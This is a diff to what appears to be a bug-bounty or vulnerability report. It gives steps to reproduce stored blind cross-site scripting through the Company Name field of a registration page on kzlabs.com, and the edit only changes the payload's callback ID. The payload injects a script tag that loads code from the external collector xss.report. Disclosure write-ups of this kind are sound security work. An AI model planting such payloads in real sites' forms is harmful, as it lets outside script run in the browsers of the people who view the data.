@@ -23,7 +23,7 @@ https://kzlabs.com/63.php?view=register
 ```
 3. In the **Company Name** field enter the following blind XSS payload:
 ```
-'"><script src=https://xss.report/c/ali1></script>
+'"><script src=https://xss.report/c/tali></script>
 ```
 3. Complete registration and log in.
 5. Navigate to **My Profile** and the Company field shows `'">` confirming the payload was stored as-is but the script tag portion loaded silently in the background.
@@ -34,7 +34,7 @@ https://kzlabs.com/63.php?view=register
 ---
 ## Payload Used
 ```
-'"><script src=https://xss.report/c/ali1></script>
+'"><script src=https://xss.report/c/tali></script>
 ```
 
 ---
